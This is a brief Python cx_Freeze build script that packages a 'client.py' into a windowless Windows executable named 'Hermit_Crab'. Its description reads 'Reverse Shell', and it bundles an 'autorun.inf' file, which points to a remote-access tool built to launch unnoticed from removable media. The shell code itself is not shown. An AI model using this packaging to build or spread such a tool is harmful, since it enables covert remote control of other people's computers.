import sys
from cx_Freeze import setup, Executable

include_files = ['autorun.inf']

base = None
if sys.platform == "win32":
    base = "Win32GUI"

setup(name="Hermit_Crab",
      version="0.1",
      description="Reverse Shell",
      options={'build_exe': {'include_files': include_files}},
      executables=[Executable("client.py", base=base)])